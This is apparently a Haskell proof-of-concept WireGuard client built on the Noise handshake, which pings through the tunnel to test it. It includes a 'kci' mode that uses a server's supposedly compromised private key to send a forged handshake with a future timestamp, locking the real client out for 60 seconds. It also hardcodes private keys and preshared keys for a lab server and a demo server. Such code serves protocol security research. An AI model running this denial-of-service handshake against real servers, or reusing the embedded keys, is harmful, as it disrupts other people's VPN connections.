{-# LANGUAGE BlockArguments #-}
{-# LANGUAGE RecordWildCards #-}
{-# LANGUAGE LambdaCase #-}
module Main where

import Control.Monad.IO.Class (liftIO)
import Control.Monad.Trans.State.Strict (StateT, runStateT)
import Control.Monad (void)
import Crypto.Noise (NoiseState, NoiseResult (..))
import Crypto.Hash.BLAKE2.BLAKE2s (hash)
import Data.ByteArray (convert)
import Data.ByteString (ByteString, replicate, take, drop)
import Data.ByteString.Builder (toLazyByteString, int64LE)
import Data.ByteString.Lazy (toStrict)
import Data.Int (Int64)
import Data.Maybe (fromMaybe)
import Data.Time.Clock (getCurrentTime, addUTCTime)
import Data.Time.Clock.POSIX (utcTimeToPOSIXSeconds)
import Data.Time.TAI64 (TAI64N, posixToTAI64N, getCurrentTAI64N)
import Data.Tuple (swap)
import System.Environment (getArgs)
import Prelude hiding (replicate, take, drop)

import qualified Control.Monad.Trans.State.Strict as State
import qualified Crypto.Noise                       as Noise
import qualified Crypto.Noise.Cipher.ChaChaPoly1305 as Noise
import qualified Crypto.Noise.DH                    as Noise
import qualified Crypto.Noise.DH.Curve25519         as Noise
import qualified Crypto.Noise.HandshakePatterns     as Noise
import qualified Crypto.Noise.Hash.BLAKE2s          as Noise
import qualified Data.ByteString.Base16 as B16
import qualified Data.ByteString.Base64 as B64
import qualified Data.Serialize as S
import qualified Network.Socket            as Socket
import qualified Network.Socket.ByteString as NBS


type WgTunnel = ( Socket.Socket
                , NoiseState Noise.ChaChaPoly1305 Noise.Curve25519 Noise.BLAKE2s
                , ByteString -- | wireguard index of other peer
                , Socket.SockAddr -- | udp stuff
                , Int64 -- | counter
                )

data WgServer = WgServer
  { ip           :: String
  , port         :: String
  , myKeyB64     :: ByteString
  , serverKeyB64 :: ByteString
  , pskB64       :: ByteString
  }

chooseServer :: String -> WgServer
chooseServer "mine" = WgServer
  { ip           = "192.168.56.106"
  , port         = "12913"
  , myKeyB64     = "WEdbOUZMcGfEv4cPwc82V1iG/jHOGmn9yykHPDzcfU8=" -- private key
  , serverKeyB64 = "Y+hxO1lqC4q2seffF7CnlLtdGuv2LUmayCPX5cr8uQw=" -- public key
  , pskB64       = "y//Lcw/S1qTETZD35XkAF+wXPQ0EJZCcsfeGCptPPgQ="
  }
chooseServer "mine-kci" = WgServer
  { ip           = "192.168.56.106"
  , port         = "12913"
  , myKeyB64     = "xbQmc84AtenD/qWxVVB/dFvHy3mnCQudDwMLVIReXwk=" -- public key
  , serverKeyB64 = "cPJ/Y+Ofeq4hWFAKQWSbQg353kd/7iIw/xQJR2DDw1k=" -- private key
  , pskB64       = "y//Lcw/S1qTETZD35XkAF+wXPQ0EJZCcsfeGCptPPgQ="
  }
chooseServer "default" = WgServer
  { ip           = "demo.wireguard.com"
  , port         = "12913"
  , myKeyB64     = "WAmgVYXkbT2bCtdcDwolI88/iVi/aV3/PHcUBTQSYmo=" -- private key
  , serverKeyB64 = "qRCwZSKInrMAq5sepfCdaCsRJaoLe5jhtzfiw7CjbwM=" -- public key
  , pskB64       = "FpCyhws9cxwWoV4xELtfJvjJN+zQVRPISllRWgeopVE="
  }
chooseServer _ = chooseServer "default"


main :: IO ()
main = getArgs >>= \case
    ["kci"] -> doKci
    [s] -> usualMain s
    [] -> usualMain "default"
    _ -> putStrLn "too many arguments"

-- | Connect and test tunnel working
usualMain :: String -> IO ()
usualMain name = do
  putStrLn "Start"
  let serv = chooseServer name
  putStrLn $ "Connecting to " <> ip serv
  --
  conn1 <- connectWg serv
  putStrLn "connected"
  testIcmp "one" conn1 >>= testIcmp "two" >>= wgClose
  putStrLn "disconnected"

-- | Dos-attack a tunnel
doKci :: IO ()
doKci = do
  now <- getCurrentTime
  let future' = 60 `addUTCTime` now
  let future = posixToTAI64N . utcTimeToPOSIXSeconds $ future'
  let serv = chooseServer "mine-kci"
  --
  _conn1 <- connectWgKci serv future
  putStrLn "done for 60 seconds"

-- | Simplest test that tunnel works
testIcmp :: String -> WgTunnel -> IO WgTunnel
testIcmp mark tun = fst <$> flip runWg tun do
  send sampleICMPRequest
  liftIO . putStrLn $ "sent icmp " <> mark
  icmpPayload <- recv
  liftIO . putStrLn $ "recv icmp " <> mark
  if validateICMPResponse icmpPayload
    then liftIO $ putStrLn "icmp ok"
    else error $ "unexpected ICMP response from server!"

sampleICMPRequest :: ByteString
sampleICMPRequest = fst . B16.decode $
  "450000250000000014018f5b0abd81020abd810108001bfa039901b6576972654775617264"


validateICMPResponse :: ByteString -> Bool
validateICMPResponse r =
  -- Strip off part of IPv4 header because this is only a demo.
  drop 12 sample == drop 12 r
  where
    sample = fst . B16.decode $ "45000025e3030000400180570abd81010abd8102000023fa039901b65769726547756172640000000000000000000000"


-- | low-low level noise messaging
unsafeMessage :: (Noise.Cipher c, Noise.DH d, Noise.Hash h)
              => Bool
              -> Maybe Noise.ScrubbedBytes
              -> Noise.ScrubbedBytes
              -> NoiseState c d h
              -> (Noise.ScrubbedBytes, NoiseState c d h)
unsafeMessage write mpsk msg ns = case operation msg ns of
  NoiseResultMessage ct ns' -> (ct, ns')

  NoiseResultNeedPSK ns' -> case mpsk of
    Nothing -> error "psk required but not provided"
    Just k  -> case operation k ns' of
      NoiseResultMessage ct ns'' -> (ct, ns'')
      NoiseResultException e -> error (show e)
      _ -> error "something terrible happened"

  NoiseResultException e -> error (show e)
  where
    operation = if write then Noise.writeMessage else Noise.readMessage


-- establish connection

-- | Connect to server as usual
connectWg :: WgServer -> IO WgTunnel
connectWg s = connectWgTime s Nothing

-- | Connect to server with non-standard timestamp
connectWgTime :: WgServer -> Maybe TAI64N -> IO WgTunnel
connectWgTime WgServer {..} mbTime = do
  addrInfo <- head <$> Socket.getAddrInfo Nothing (Just ip) (Just port)
  let addr = Socket.addrAddress addrInfo
  sock     <- Socket.socket (Socket.addrFamily addrInfo) Socket.Datagram
                            Socket.defaultProtocol

  let myStaticKey = fromMaybe (error "invalid private key")
                    . Noise.dhBytesToPair
                    . convert
                    . either (error "error Base64 decoding my private key") id
                    . B64.decode
                    $ myKeyB64 :: Noise.KeyPair Noise.Curve25519

  let serverKey   = fromMaybe (error "invalid public key")
                    . Noise.dhBytesToPub
                    . convert
                    . either (error "error Base64 decoding server public key") id
                    . B64.decode
                    $ serverKeyB64 :: Noise.PublicKey Noise.Curve25519

  let psk         = convert
                    . either (error "error decoding PSK") id
                    . B64.decode
                    $ pskB64 :: Noise.ScrubbedBytes
  myEphemeralKey <- Noise.dhGenKey

  let dho  = Noise.defaultHandshakeOpts Noise.InitiatorRole "WireGuard v1 zx2c4 Jason@zx2c4.com"
  let opts = Noise.setLocalEphemeral (Just myEphemeralKey)
             . Noise.setLocalStatic  (Just myStaticKey)
             . Noise.setRemoteStatic (Just serverKey)
             $ dho
  let ns0  = Noise.noiseState opts Noise.noiseIKpsk2 :: NoiseState Noise.ChaChaPoly1305 Noise.Curve25519 Noise.BLAKE2s

  let time = maybe getCurrentTAI64N pure $ mbTime
  tai64n <- convert . S.encode <$> time

  -- Handshake: Initiator to responder -----------------------------------------

  let (msg0, ns1) = unsafeMessage True Nothing tai64n ns0
  let macKey      = hash 32 mempty $ "mac1----" <> (convert . Noise.dhPubToBytes) serverKey
  let initiation  = "\x01\x00\x00\x00\x1c\x00\x00\x00" <> convert msg0 -- sender index = 28 to match other examples
  let mac1        = hash 16 macKey initiation

  void $ NBS.sendTo sock (initiation <> mac1 <> replicate 16 0) addr

  -- Handshake: Responder to initiator -----------------------------------------

  (response0, _) <- NBS.recvFrom sock 1024

  let theirIndex  = take 4  . drop 4  $ response0
  let (_, ns2)    = unsafeMessage False (Just psk) (convert . take 48 . drop 12 $ response0) ns1
  pure (sock, ns2, theirIndex, addr, 0)


-- | Perform a KCI DOS attack on server.
-- Fields of server are reinterpreted: public becomes private and vice versa
connectWgKci :: WgServer -> TAI64N -> IO ()
connectWgKci WgServer {..} time = do
  addrInfo <- head <$> Socket.getAddrInfo Nothing (Just ip) (Just port)
  let addr = Socket.addrAddress addrInfo
  sock     <- Socket.socket (Socket.addrFamily addrInfo) Socket.Datagram
                            Socket.defaultProtocol

  let clientStaticKey = fromMaybe (error "invalid private key")
                    . Noise.dhBytesToPub
                    . convert
                    . either (error "error Base64 decoding my private key") id
                    . B64.decode
                    $ myKeyB64 :: Noise.PublicKey Noise.Curve25519

  let serverKey = fromMaybe (error "invalid public key")
                  . Noise.dhBytesToPair
                  . convert
                  . either (error "error Base64 decoding server public key") id
                  . B64.decode
                  $ serverKeyB64 :: Noise.KeyPair Noise.Curve25519

  myEphemeralKey <- Noise.dhGenKey

  let dho  = Noise.defaultHandshakeOpts Noise.InitiatorRole "WireGuard v1 zx2c4 Jason@zx2c4.com"
  let opts = Noise.setLocalEphemeral     (Just myEphemeralKey)
             . Noise.setLocalStaticPart  (Just clientStaticKey)
             . Noise.setRemoteStaticFull (Just serverKey)
             $ dho
  let ns0  = Noise.noiseState opts Noise.noiseIKpsk2 :: NoiseState Noise.ChaChaPoly1305 Noise.Curve25519 Noise.BLAKE2s

  let tai64n = convert . S.encode $ time

  -- Handshake: Initiator to responder -----------------------------------------

  let (msg0, _ns1) = unsafeMessage True Nothing tai64n ns0
  let macKey      = hash 32 mempty $ "mac1----" <> (convert . Noise.dhPubToBytes . snd) serverKey
  let initiation  = "\x01\x00\x00\x00\x1c\x00\x00\x00" <> convert msg0 -- sender index = 28 to match other examples
  let mac1        = hash 16 macKey initiation

  void $ NBS.sendTo sock (initiation <> mac1 <> replicate 16 0) addr


-- low-level tunnel usage


wgSend :: WgTunnel -> ByteString -> IO WgTunnel
wgSend (sock, ns, theirIndex, addr, counter) msg = do
  let (encMsg, ns') = unsafeMessage True Nothing (convert msg) ns
  let counterBs = toStrict . toLazyByteString . int64LE $ counter
  --             type                  index         counter       message
  let encMsg' = "\x04\x00\x00\x00" <> theirIndex <> counterBs <> convert encMsg
  void $ NBS.sendTo sock encMsg' addr
  pure (sock, ns', theirIndex, addr, counter + 1)

wgRecv :: WgTunnel -> IO (WgTunnel, ByteString)
wgRecv (sock, ns, theirIndex, addr, counter) = do
  (response, _) <- NBS.recvFrom sock 1024
  let (payload, ns') = unsafeMessage False Nothing (convert . drop 16 $ response) ns
  pure ((sock, ns', theirIndex, addr, counter), convert payload)

wgClose :: WgTunnel -> IO ()
wgClose (sock, ns, theirIndex, addr, counter) = do
  let (msg2, _) = unsafeMessage True Nothing mempty ns
  let counterBs = toStrict . toLazyByteString . int64LE $ counter
  --               type                    index       counter       message
  let keepAlive = "\x04\x00\x00\x00" <> theirIndex <> counterBs <> convert msg2
  void $ NBS.sendTo sock keepAlive addr
  Socket.close' sock

-- high-level usage

type WG = StateT WgTunnel IO

runWg :: WG a -> WgTunnel -> IO (WgTunnel, a)
runWg wg tun = swap <$> runStateT wg tun

send :: ByteString -> WG ()
send msg = do
  wgState1 <- State.get
  wgState2 <- liftIO $ wgSend wgState1 msg
  State.put wgState2

recv :: WG ByteString
recv = do
  wgState1 <- State.get
  (wgState2, msg) <- liftIO $ wgRecv wgState1
  State.put wgState2
  pure msg
